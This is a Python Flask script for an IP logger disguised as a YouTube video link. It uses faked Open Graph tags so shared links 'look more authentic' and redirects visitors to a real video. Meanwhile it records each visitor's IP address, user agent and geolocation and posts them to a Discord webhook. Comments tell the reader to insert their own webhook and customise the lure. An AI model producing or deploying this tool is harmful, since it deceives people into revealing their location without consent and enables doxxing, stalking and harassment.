from flask import Flask, request, render_template_string
from datetime import datetime
import requests
import threading


app = Flask(__name__)

def get_geo_info(ip):
    response = requests.get(f"https://ipapi.co/{ip}/json/")
    return response.json()

#For privacy reasons, I have removed my webhooks url, but replace the placeholder text with your own when coding!
def send_ip(ip, date, user_agent, location, address, postal):
    webhook_url = "insert discord webhook url here"
    data = {
        "content": "",
        "title": "IP Logger"
    }
    data["embeds"] = [
        {
            "title": ip,
            "description": f"Date: {date}\nUser Agent: {user_agent}\nLocation: {location}\nAddress: {address}\nPostal Code: {postal}"
         }
    ]
    requests.post(webhook_url, json=data)

@app.route("/")
def index():
    ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or request.remote_addr
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    user_agent = request.headers.get('User-Agent')
    location_info = get_geo_info(ip)

    location = f"{location_info.get('city')}, {location_info.get('region')}, {location_info.get('country')}"
    address = location_info.get('address', 'N/A')  # Fallback if address is not provided
    postal = location_info.get('postal', 'N/A')  # Fallback if postal code is not provided

    threading.Thread(target=send_ip, args=(ip, date, user_agent, location, address, postal)).start()


#This section is to make the thumbnail link look more authentic
#But replace the text and links with whatever you want!
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Redirecting to YouTube</title>
        <meta property="og:title" content="Making a BULLETPROOF John Wick Suit in Real Life! - YouTube" />
        <meta property="og:description" content="John Wick Bulletproof Vest" />
        <meta property="og:url" content="https://www.youtube.com/watch?v=i-DqL1UJdAE&list=PL0FjC4E6sG8kxVlsPfXSZg_WfRdbzbcj6&index=16" />
        <meta property="og:type" content="video.other" />
        <meta property="og:image" content="https://i.ytimg.com/vi/i-DqL1UJdAE/maxresdefault.jpg" />
        <script type="text/javascript">
            function redirect() {
                window.location.replace("https://www.youtube.com/watch?v=i-DqL1UJdAE&list=PL0FjC4E6sG8kxVlsPfXSZg_WfRdbzbcj6&index=16");
            }
            window.onload = redirect;
        </script>
    </head>
    <body>
        <p>Redirecting to YouTube...</p>
    </body>
    </html>
    '''
    return render_template_string(html)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)  # Changed port number